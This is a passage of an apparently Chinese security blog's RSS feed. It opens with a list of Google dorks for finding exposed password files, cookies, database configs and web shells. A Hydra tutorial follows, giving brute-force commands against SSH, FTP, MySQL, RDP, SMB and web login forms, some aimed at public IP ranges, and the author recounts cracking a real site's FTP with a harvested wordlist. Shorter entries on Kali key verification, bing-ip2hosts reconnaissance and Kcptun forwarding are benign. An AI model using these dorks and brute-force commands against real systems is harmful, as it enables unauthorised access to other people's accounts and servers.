&lt;p&gt;Ganglia Cluster Reports&lt;/p&gt;

&lt;p&gt;haccess.ctl (one way)&lt;br /&gt;
haccess.ctl (VERY reliable)&lt;br /&gt;
ICQ chat logs, please…&lt;/p&gt;

&lt;p&gt;iletype:log cron.log&lt;br /&gt;
intext:&amp;ldquo;Session Start * * * &lt;em&gt;:&lt;/em&gt;:* *&amp;rdquo; filetype:log&lt;br /&gt;
intext:&amp;ldquo;Tobias Oetiker&amp;rdquo; &amp;ldquo;traffic analysis&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intext:(password | passcode) intext:(username | userid | user) filetype:csv&lt;br /&gt;
intext:gmail invite intext:&lt;a href=&#34;http://gmail.google.com/gmail/a&#34; target=&#34;_blank&#34;&gt;http://gmail.google.com/gmail/a&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;intext:SQLiteManager inurl:main.php&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;Apache::Status&amp;rdquo; (inurl:server-status | inurl:status.html | inurl:apache.html)&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;AppServ Open Project&amp;rdquo; -site:www.appservnetwork.com&lt;br /&gt;
intitle:&amp;ldquo;ASP Stats Generator &lt;em&gt;.&lt;/em&gt;&amp;rdquo; &amp;ldquo;ASP Stats Generator&amp;rdquo; &amp;ldquo;- weppos&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;FTP root at&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;index of&amp;rdquo; +myd size&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;Index Of&amp;rdquo; -inurl:maillog maillog size&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;Index Of&amp;rdquo; cookies.txt size&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;index of&amp;rdquo; mysql.conf OR mysql_config&lt;br /&gt;
intitle:&amp;ldquo;Index of&amp;rdquo; upload size parent directory&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;index.of&amp;rdquo; .diz .nfo last modified&lt;br /&gt;
intitle:&amp;ldquo;Multimon UPS status page&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;PHP Advanced Transfer&amp;rdquo; (inurl:index.php | inurl:showrecent.php )&lt;br /&gt;
intitle:&amp;ldquo;PhpMyExplorer&amp;rdquo; inurl:&amp;ldquo;index.php&amp;rdquo; -cvs&lt;br /&gt;
———————————————————————&lt;br /&gt;
intitle:&amp;ldquo;statistics of&amp;rdquo; &amp;ldquo;advanced web statistics&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;System Statistics&amp;rdquo; +&amp;ldquo;System and Network Information Center&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;Usage Statistics for&amp;rdquo; &amp;ldquo;Generated by Webalizer&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;wbem&amp;rdquo; compaq login &amp;ldquo;Compaq Information Technologies Group&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;Web Server Statistics for ****&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;web server status&amp;rdquo; SSH Telnet&lt;br /&gt;
intitle:&amp;ldquo;welcome.to.squeezebox&amp;rdquo;&lt;/p&gt;

&lt;p&gt;intitle:admin intitle:login&lt;br /&gt;
intitle:index.of &amp;ldquo;Apache&amp;rdquo; &amp;ldquo;server at&amp;rdquo;&lt;br /&gt;
intitle:index.of cleanup.log&lt;br /&gt;
intitle:index.of dead.letter&lt;br /&gt;
intitle:index.of inbox&lt;br /&gt;
intitle:index.of inbox dbx&lt;/p&gt;

&lt;p&gt;intitle:intranet inurl:intranet +intext:&amp;ldquo;phone&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;/axs/ax-admin.pl&amp;rdquo; -script&lt;br /&gt;
inurl:&amp;ldquo;/cricket/grapher.cgi&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;bookmark.htm&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:&amp;ldquo;cacti&amp;rdquo; +inurl:&amp;ldquo;graph_view.php&amp;rdquo; +&amp;ldquo;Settings Tree View&amp;rdquo; -cvs -RPM&lt;br /&gt;
inurl:&amp;ldquo;newsletter/admin/&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;newsletter/admin/&amp;rdquo; intitle:&amp;ldquo;newsletter admin&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;putty.reg&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;smb.conf&amp;rdquo; intext:&amp;ldquo;workgroup&amp;rdquo; filetype:conf conf&lt;br /&gt;
———————————————————————————————————-&lt;/p&gt;

&lt;p&gt;Welcome to ntop!&lt;/p&gt;

&lt;p&gt;&amp;ldquo;adding new user&amp;rdquo; inurl:addnewuser -&amp;ldquo;there are no domains&amp;rdquo;&lt;br /&gt;
(inurl:/cgi-bin/.cobalt/) | (intext:&amp;ldquo;Welcome to the Cobalt RaQ&amp;rdquo;)&lt;/p&gt;

&lt;p&gt;filetype:php HAXPLORER &amp;ldquo;Server Files Browser&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;Web Data Administrator – Login&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:ConnectComputer/precheck.htm | inurl:Remote/logon.aspx&lt;br /&gt;
PHP Shell (unprotected)&lt;br /&gt;
PHPKonsole PHPShell filetype:php -echo&lt;br /&gt;
Public PHP FileManagers&lt;/p&gt;

&lt;p&gt;&amp;ldquo;index of&amp;rdquo; / picasa.ini&lt;br /&gt;
&amp;ldquo;index of&amp;rdquo; inurl:recycler&lt;br /&gt;
&amp;ldquo;Index of&amp;rdquo; rar r nfo Modified&lt;br /&gt;
&amp;ldquo;intitle:Index.Of /&amp;rdquo; stats merchant cgi-* etc&lt;br /&gt;
&amp;ldquo;Powered by Invision Power File Manager&amp;rdquo; (inurl:login.php) | (intitle:&amp;ldquo;Browsing directory /&amp;rdquo; )&lt;br /&gt;
&amp;ldquo;Web File Browser&amp;rdquo; &amp;ldquo;Use regular expression&amp;rdquo;&lt;/p&gt;

&lt;p&gt;filetype:ini Desktop.ini intext:mydocs.dll&lt;/p&gt;

&lt;p&gt;intext:&amp;ldquo;d.aspx?id&amp;rdquo; || inurl:&amp;ldquo;d.aspx?id&amp;rdquo;&lt;br /&gt;
intext:&amp;ldquo;Powered By: TotalIndex&amp;rdquo; intitle:&amp;ldquo;TotalIndex&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;album permissions&amp;rdquo; &amp;ldquo;Users who can modify photos&amp;rdquo; &amp;ldquo;EVERYBODY&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;Directory Listing For&amp;rdquo; intext:Tomcat -intitle:Tomcat&lt;br /&gt;
intitle:&amp;ldquo;HFS /&amp;rdquo; +&amp;ldquo;HttpFileServer&amp;rdquo;&lt;br /&gt;
intitle:&amp;ldquo;Index of *&amp;rdquo; inurl:&amp;ldquo;my shared folder&amp;rdquo; size modified&lt;br /&gt;
——————————————————————————————————————-&lt;/p&gt;

&lt;p&gt;&amp;ldquo;File Upload Manager v.&amp;rdquo; &amp;ldquo;rename to&amp;rdquo;&lt;/p&gt;

&lt;p&gt;ext:asp &amp;ldquo;powered by DUForum&amp;rdquo; inurl:(messages|details|login|default|register) -site:duware.com&lt;br /&gt;
ext:asp inurl:DUgallery intitle:&amp;ldquo;.&amp;rdquo; -site:dugallery.com -site:duware.com&lt;br /&gt;
ext:cgi inurl:ubb_test&lt;/p&gt;

&lt;p&gt;ezBOO &amp;ldquo;Administrator Panel&amp;rdquo; -cvs&lt;/p&gt;

&lt;p&gt;filetype:cgi inurl:cachemgr.cgi&lt;br /&gt;
filetype:cnf my.cnf -cvs -example&lt;br /&gt;
filetype:inc inc intext:setcookie&lt;/p&gt;

&lt;p&gt;filetype:php inurl:&amp;ldquo;viewfile&amp;rdquo; -&amp;ldquo;index.php&amp;rdquo; -&amp;ldquo;idfil&lt;br /&gt;
filetype:wsdl wsdl&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;ASP FileMan&amp;rdquo; Resend -site:iisworks.com&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;Index of /&amp;rdquo; modified php.exe&lt;/p&gt;

&lt;p&gt;intitle:&amp;ldquo;phpremoteview&amp;rdquo; filetype:php &amp;ldquo;Name, Size, Type, Modify&amp;rdquo;&lt;/p&gt;

&lt;p&gt;inurl:&amp;rdquo; WWWADMIN.PL&amp;rdquo; intitle:&amp;ldquo;wwwadmin&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;nph-proxy.cgi&amp;rdquo; &amp;ldquo;Start browsing through this CGI-based proxy&amp;rdquo;&lt;br /&gt;
inurl:&amp;ldquo;plog/register.php&amp;rdquo;&lt;br /&gt;
inurl:cgi.asx?StoreID&lt;/p&gt;

&lt;p&gt;inurl:robpoll.cgi filetype:cgi&lt;/p&gt;

&lt;p&gt;The Master List&lt;/p&gt;

&lt;p&gt;&amp;ldquo;More Info about MetaCart Free&amp;rdquo;&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Hydra 破解登录密码</title>
            <link>http://blog.pytool.com/hacker/2015-03-29-hydra/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/2015-03-29-hydra/</guid>
            <description>

&lt;p&gt;hydra -L user.txt -P pass.txt -o savessh.log -f -vV -e ns 10.0.5.24 ssh&lt;br /&gt;
hydra -L user.txt -P sup.txt -o savessh.log -f -vV -e ns 113.105.144.130 mysql&lt;br /&gt;
hydra -M list.txt -l root -P dict1000.txt -t 64 -o ssh.txt ssh&lt;/p&gt;

&lt;p&gt;###Hydra 破解登录密码###&lt;/p&gt;

&lt;p&gt;格式：&lt;/p&gt;

&lt;p&gt;hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]&lt;br /&gt;
server service [OPT] # 可选的&lt;/p&gt;

&lt;p&gt;-R 继续从上一次进度接着破解&lt;br /&gt;
-S 采用SSL链接（大写的S）&lt;br /&gt;
-s PORT 如果非默认端口，可通过这个参数指定&lt;br /&gt;
-l LOGIN 小写，用于指定破解的用户，对特定用户破解&lt;br /&gt;
-L FILE 大写，用于指定用户的用户名字典&lt;br /&gt;
-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典&lt;br /&gt;
-P FILE 大写，用于指定密码字典&lt;br /&gt;
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探&lt;br /&gt;
-C FILE 使用冒号分割格式 例如 “登录名:密码”来代替-L/-P参数&lt;br /&gt;
-M FILE 指定目标列表文件一行一条&lt;br /&gt;
-o FILE 指定结果输出文件&lt;br /&gt;
-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解&lt;br /&gt;
-t TASKS 同时运行的线程数，默认为16&lt;br /&gt;
-w TIME 设置最大超时的时间，单位秒，默认是30s&lt;br /&gt;
-v / -V 显示详细过程&lt;br /&gt;
server 目标ip&lt;br /&gt;
service 指定服务名，支持如下:&lt;br /&gt;
telnet ftp pop3[-ntlm]&lt;br /&gt;
imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco&lt;br /&gt;
cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5&lt;br /&gt;
rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere&lt;br /&gt;
teamspeak sip vmauthd firebird ncp afp&lt;/p&gt;

&lt;p&gt;OPT 可选项&lt;/p&gt;

&lt;p&gt;###如何使用代理服务器进行破解（这一点主要处于攻击者的ip，处于自身安全考虑）### HYDRA_PROXY_HTTP 变量参数可以用来定义代理服务器(只能使用http代理) 语法:&lt;/p&gt;

&lt;p&gt;HYDRA_PROXY_HTTP=”&lt;a href=&#34;http://ip:port/”&#34; target=&#34;_blank&#34;&gt;http://ip:port/”&lt;/a&gt;&lt;br /&gt;
HYDRA_PROXY_CONNECT=ip:8000&lt;/p&gt;

&lt;p&gt;如果你使用的代理需要用户名和密码，请使用HYDRA_PROXY_AUTH 变量参数:&lt;/p&gt;

&lt;p&gt;HYDRA_PROXY_AUTH=”the_login:the_password”&lt;/p&gt;

&lt;p&gt;###实例破解###&lt;/p&gt;

&lt;p&gt;####1.ftp密码破解#### 结合自己实例，最近试探一个网站，得到了ftp用户，是serv-u6.02但是无法破解密码，我通过收集这些ftp用户将结果保存在 ftpuser.lst文件中，同时通过收集各个网站的信息，包括管理员的信息组合形成一个密码字典ftppwd.lst。于是，就开始尝试破解，命令如 下：&lt;/p&gt;

&lt;p&gt;sudo hydra -L /home/dict/ftpuser.lst -P /home/dict/ftppwd.lst 218.86.103.* ftp&lt;/p&gt;

&lt;p&gt;这个是基于多用户密码破解，另外还有一个本地ftp密码破解方案。为了效率我直接将密码写入到pwd.lst字典中&lt;/p&gt;

&lt;p&gt;sudo hydra -l administrator -P /home/dict/pwd.lst -v 192.168.8.6 ftp&lt;/p&gt;

&lt;p&gt;返回结果如下，成功破解了密码：&lt;/p&gt;

&lt;h1 id=&#34;该行说明任务总数-会根据你提供用户名和密码进行计算-l-1-p-2表示一个用户名-密码字典中又2个密码&#34;&gt;该行说明任务总数，会根据你提供用户名和密码进行计算，l:1/p:2表示一个用户名，密码字典中又2个密码&lt;/h1&gt;

&lt;p&gt;[DATA] 2 tasks, 1 servers, 2 login tries (l:1/p:2), ~1 tries per task&lt;br /&gt;
[DATA] attacking service ftp on port 21&lt;br /&gt;
[VERBOSE] Resolving addresses … done&lt;br /&gt;
[STATUS] attack finished for 192.168.8.6 (waiting for childs to finish)&lt;/p&gt;

&lt;h1 id=&#34;破解成功-直接显示出来-当然你可以让他输出到文件-通过参数-o设定&#34;&gt;破解成功，直接显示出来，当然你可以让他输出到文件，通过参数-o设定&lt;/h1&gt;

&lt;p&gt;[21][ftp] host: 192.168.8.6 login: administrator password: 123&lt;/p&gt;

&lt;p&gt;通过这种方法有极大可能破解这个ftp，当然关键在于你的字典，我们可以通过字典生成器就可以很好的破解了.&lt;/p&gt;

&lt;p&gt;####2.samba密码破解#### 利用nmap扫描到服务器开启了samba服务，于是尝试收集该服务器信息组合成密码字典。由于该应用类似ftp破解，这里不对具体演示，只是将ftp服务改成smb服务即可。&lt;/p&gt;

&lt;p&gt;####3.网站后台密码破解#### 该软件的强大之处就在于支持多种协议的破解，同样他也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具又一个不好的地方就是，如果目标网站登录时候需要验证码无法破解了。带参数破解如下：&lt;/p&gt;

&lt;p&gt;&lt;form action=”index.php” method=”POST”&gt;&lt;br /&gt;
&lt;input type=”text” name=”name” /&gt;&lt;BR&gt;&lt;br&gt;&lt;br /&gt;
&lt;input type=”password” name=”pwd” /&gt;&lt;br&gt;&lt;br&gt;&lt;br /&gt;
&lt;input type=”submit” name=”sub” value=”提交”&gt;&lt;/p&gt;

&lt;p&gt;假设有以上一个密码登录表单，我们执行命令：&lt;/p&gt;

&lt;p&gt;sudo hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&amp;amp;pwd=^PASS^:&lt;title&gt;invalido&lt;/title&gt;”&lt;/p&gt;

&lt;h1 id=&#34;破解的用户名是admin-密码字典是pass-lst-破解结果保存在ok-lst-t是同时线程数为1-f是当破解了一个密码就停止-ip是本-地-就是目标ip-http-post-form表示破解是采用http的post方式提交的表单密码破解后面参数是网页中对应的表单字段的name属-性-后面title中的内容是表示错误猜解的返回信息提示-可以自定义&#34;&gt;破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t是同时线程数为1，-f是当破解了一个密码就停止，ip是本 地，就是目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解后面参数是网页中对应的表单字段的name属 性,后面title中的内容是表示错误猜解的返回信息提示，可以自定义。&lt;/h1&gt;

&lt;p&gt;###总结### 该工具的强大只有你自行体验了，当然密码能否破解关键在于你的字典。以上一些实例操作仅仅是提供的支持的众多服务中的3种，其他的服务也同样非常强大，留给大家自行体会。其实密码字典的生成有相关的工 具，你可以自己生成符合一定规则的密码字典。当然如果你是一个成功的社工专家，往往能够得到事半功倍的效果。&lt;/p&gt;

&lt;p&gt;####1、破解ssh：####&lt;/p&gt;

&lt;p&gt;hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh&lt;br /&gt;
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh&lt;/p&gt;

&lt;p&gt;####2、破解ftp：#### hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV&lt;/p&gt;

&lt;p&gt;####3、get方式提交，破解web登录：#### hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php&lt;/p&gt;

&lt;p&gt;####4、post方式提交，破解web登录：####&lt;/p&gt;

&lt;p&gt;hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &amp;ldquo;/admin/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;submit=login:sorry password&amp;rdquo;&lt;br /&gt;
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &amp;ldquo;login.php:id=^USER^&amp;amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&amp;ldquo;&lt;/p&gt;

&lt;p&gt;（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中的内容是表示错误猜解的返回信息提示。）&lt;/p&gt;

&lt;p&gt;####5、破解https：####&lt;/p&gt;

&lt;p&gt;hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https&lt;/p&gt;

&lt;p&gt;####6、破解teamspeak：####&lt;/p&gt;

&lt;p&gt;hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak&lt;/p&gt;

&lt;p&gt;####7、破解cisco：####&lt;/p&gt;

&lt;p&gt;hydra -P pass.txt 10.36.16.18 cisco&lt;br /&gt;
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable&lt;/p&gt;

&lt;p&gt;####8、破解smb：####&lt;/p&gt;

&lt;p&gt;hydra -l administrator -P pass.txt 10.36.16.18 smb&lt;/p&gt;

&lt;p&gt;####9、破解pop3：####&lt;/p&gt;

&lt;p&gt;hydra -l muts -P pass.txt my.pop3.mail pop3&lt;/p&gt;

&lt;p&gt;####10、破解rdp：####&lt;/p&gt;

&lt;p&gt;hydra ip rdp -l administrator -P pass.txt -V&lt;/p&gt;

&lt;p&gt;####11、破解http-proxy：####&lt;/p&gt;

&lt;p&gt;hydra -l admin -P pass.txt http-proxy://10.36.16.18&lt;/p&gt;

&lt;p&gt;####12、破解imap：####&lt;/p&gt;

&lt;p&gt;hydra -L user.txt -p secret 10.36.16.18 imap PLAIN&lt;br /&gt;
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAINshot&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Kali</title>
            <link>http://blog.pytool.com/hacker/2016-03-29-kali/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/2016-03-29-kali/</guid>
            <description>&lt;p&gt;&lt;a href=&#34;https://www.kali.org/downloads/&#34; target=&#34;_blank&#34;&gt;Kali &lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ wget -q -O - https://www.kali.org/archive-key.asc | gpg --import  
# or...  
$ gpg --keyserver hkp://keys.gnupg.net --recv-key 7D8D0BF6  
  # ...and verify that the displayed fingerprint matches the one below  
$ gpg --list-keys --with-fingerprint 7D8D0BF6  
  pub 4096R/7D8D0BF6 2012-03-05 [expires: 2018-02-02]  
  Key fingerprint = 44C6 513A 8E4F B3D3 0875 F758 ED44 4FF0 7D8D 0BF6  
  uid Kali Linux Repository &amp;lt;devel@kali.org&amp;gt;  
  sub 4096R/FC0D0DCB 2012-03-05 [expires: 2018-02-02]  

gpg --verify SHA1SUMS.gpg SHA1SUMS  
  gpg: Signature made Thu Mar 7 21:26:40 2013 CET using RSA key ID 7D8D0BF6  
  gpg: Good signature from &amp;quot;Kali Linux Repository &amp;lt;devel@kali.org&amp;gt;&amp;quot;  
&lt;/code&gt;&lt;/pre&gt;
</description>
        </item>
        
        <item>
            <title>Kali Linux信息收集之bing-ip2hosts</title>
            <link>http://blog.pytool.com/hacker/01_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2016-03-29-kali-linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bbing-ip2hosts/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/01_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2016-03-29-kali-linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bbing-ip2hosts/</guid>
            <description>&lt;p&gt;0x00 bing-ip2hosts介绍&lt;/p&gt;

&lt;p&gt;Bing.com是微软拥有的以前称为MSN搜索和实时搜索的搜索引擎。它具有搜索在特定IP地址上的网站的独特功能。 Bing-ip2hosts使用此功能枚举Bing已为特定IP地址编入索引的所有主机名。这种技术被认为是在渗透测试的信息收集阶段的最佳方法，以便可以发现更大的潜在攻击面。 Bing-ip2hosts是用Linux上的Bash脚本语言编写的，因为使用移动接口的缘故，所以不需要API密钥。&lt;/p&gt;

&lt;p&gt;工具来源：&lt;a href=&#34;http://www.morningstarsecurity.com/research/bing-ip2hosts&#34; target=&#34;_blank&#34;&gt;http://www.morningstarsecurity.com/research/bing-ip2hosts&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;bing-ip2hosts主页 | Kali bing-ip2hosts Repo仓库&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;作者：Andrew Horton  
证书：GPLv3  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;0x01 bing-ip2hosts功能&lt;/p&gt;

&lt;p&gt;bing-ip2hosts - 使用bing.com枚举给定IP的主机名&lt;/p&gt;

&lt;p&gt;root@kali:~# bing-ip2hosts -h&lt;br /&gt;
bing-ip2hosts (o.4) by Andrew Horton aka urbanadventurer&lt;br /&gt;
Homepage: &lt;a href=&#34;http://www.morningstarsecurity.com/research/bing-ip2hosts&#34; target=&#34;_blank&#34;&gt;http://www.morningstarsecurity.com/research/bing-ip2hosts&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在渗透测试中的Web情报收集和攻击层面映射虚拟主机很有用&lt;br /&gt;
查找与目标共享IP地址的主机名，可以是主机名或IP地址&lt;br /&gt;
利用Microsoft Bing.com的能力通过IP地址搜索，例如：“IP：210.48.71.196”&lt;br /&gt;
用法: /usr/bin/bing-ip2hosts [选项] &lt;IP地址|主机名&gt;&lt;/p&gt;

&lt;p&gt;选项:&lt;br /&gt;
-n       关闭进度指示动画&lt;br /&gt;
-t &lt;DIR&gt; 使用指定目录而不是/tmp目录，该目录必须存在&lt;br /&gt;
-i       可选CSV输出，在每行上输出IP和主机名，以逗号分隔&lt;br /&gt;
-p       可选http：//前缀输出，方便在shell中右键单击打开&lt;br /&gt;
0x02 bing-ip2hosts用法示例&lt;/p&gt;

&lt;p&gt;root@kali:~# bing-ip2hosts -p -t /root/test microsoft.com&lt;br /&gt;
[ 65.55.58.201 | Scraping 1 | Found 0 | / ]&lt;br /&gt;
&lt;a href=&#34;http://microsoft.com&#34; target=&#34;_blank&#34;&gt;http://microsoft.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://research.microsoft.com&#34; target=&#34;_blank&#34;&gt;http://research.microsoft.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://www.answers.microsoft.com&#34; target=&#34;_blank&#34;&gt;http://www.answers.microsoft.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://www.microsoft.com&#34; target=&#34;_blank&#34;&gt;http://www.microsoft.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://www.msdn.microsoft.com&#34; target=&#34;_blank&#34;&gt;http://www.msdn.microsoft.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;root@kali:~# bing-ip2hosts -p -t /root/test 173.194.33.80&lt;br /&gt;
[ 173.194.33.80 | Scraping 60-69 of 73 | Found 41 | | ]| / ]&lt;br /&gt;
&lt;a href=&#34;http://asia.google.com&#34; target=&#34;_blank&#34;&gt;http://asia.google.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://desktop.google.com&#34; target=&#34;_blank&#34;&gt;http://desktop.google.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://ejabat.google.com&#34; target=&#34;_blank&#34;&gt;http://ejabat.google.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://google.netscape.com&#34; target=&#34;_blank&#34;&gt;http://google.netscape.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://partner-client.google.com&#34; target=&#34;_blank&#34;&gt;http://partner-client.google.com&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://picasa.google.com&#34; target=&#34;_blank&#34;&gt;http://picasa.google.com&lt;/a&gt;&lt;br /&gt;
0x03 提示&lt;/p&gt;

&lt;p&gt;最新的Kali已经移除了bing-ip2hosts，如果要使用bing-ip2hosts可以使用以下命令获取并安装：&lt;/p&gt;

&lt;p&gt;root@kali:~# wget &lt;a href=&#34;https://raw.githubusercontent.com/Strubbl/dotfiles/master/bin/bing-ip2hosts&#34; target=&#34;_blank&#34;&gt;https://raw.githubusercontent.com/Strubbl/dotfiles/master/bin/bing-ip2hosts&lt;/a&gt;&lt;br /&gt;
root@kali:~# chmod +x bing-ip2hosts&lt;br /&gt;
root@kali:~# mv bing-ip2hosts /usr/bin/&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Kcptun</title>
            <link>http://blog.pytool.com/hacker/00_%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93/2015-01-29-kcptun/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/00_%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93/2015-01-29-kcptun/</guid>
            <description>

&lt;p&gt;KCP 协议：&lt;a href=&#34;https://github.com/skywind3000/kcp&#34; target=&#34;_blank&#34;&gt;https://github.com/skywind3000/kcp&lt;/a&gt;
Kcptun 项目地址：&lt;a href=&#34;https://github.com/xtaci/kcptun&#34; target=&#34;_blank&#34;&gt;https://github.com/xtaci/kcptun&lt;/a&gt;&lt;br /&gt;
Kcp-server：&lt;a href=&#34;https://github.com/clangcn/kcp-server&#34; target=&#34;_blank&#34;&gt;https://github.com/clangcn/kcp-server&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;快速设定&#34;&gt;快速设定&lt;/h3&gt;

&lt;p&gt;客户端、服务器分别&lt;strong&gt;下载&lt;/strong&gt;对应平台的二进制压缩包，并&lt;strong&gt;解压&lt;/strong&gt;，通过下面的命令&lt;strong&gt;启动&lt;/strong&gt;端口转发。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;服务器: ./server_linux_amd64 -t &amp;quot;服务器IP地址:8388&amp;quot; -l &amp;quot;:4000&amp;quot; -mode fast2  
客户端: ./client_darwin_amd64 -r &amp;quot;服务器IP地址:4000&amp;quot; -l &amp;quot;:8388&amp;quot; -mode fast2  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上命令可以实现8388/tcp端口的转发（通过4000/udp端口）。&lt;/p&gt;

&lt;h3 id=&#34;速度对比&#34;&gt;速度对比&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;fast.png&#34; alt=&#34;fast.com&#34; height=&#34;256px&#34; /&gt;&lt;br /&gt;
* 测速网站: &lt;a href=&#34;https://fast.com&#34; target=&#34;_blank&#34;&gt;https://fast.com&lt;/a&gt;&lt;br /&gt;
* 接入速度: 100Mbps&lt;br /&gt;
* WIFI: 5GHz TL-WDR3320&lt;/p&gt;

&lt;h3 id=&#34;使用方法&#34;&gt;使用方法&lt;/h3&gt;

&lt;p&gt;在Mac OS X El Capitan下的帮助输出，注意默认值:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./client_darwin_amd64 -h  
NAME:  
   kcptun - client(with SMUX)  

USAGE:  
   client_darwin_amd64 [global options] command [command options] [arguments...]  

VERSION:  
   20161025  

COMMANDS:  
     help, h  Shows a list of commands or help for one command  

GLOBAL OPTIONS:  
   --localaddr value, -l value   local listen address (default: &amp;quot;:12948&amp;quot;)  
   --remoteaddr value, -r value  kcp server address (default: &amp;quot;vps:29900&amp;quot;)  
   --key value                   pre-shared secret between client and server (default: &amp;quot;it&#39;s a secrect&amp;quot;) [$KCPTUN_KEY]  
   --crypt value                 aes, aes-128, aes-192, salsa20, blowfish, twofish, cast5, 3des, tea, xtea, xor, none (default: &amp;quot;aes&amp;quot;)  
   --mode value                  profiles: fast3, fast2, fast, normal (default: &amp;quot;fast&amp;quot;)  
   --conn value                  set num of UDP connections to server (default: 1)  
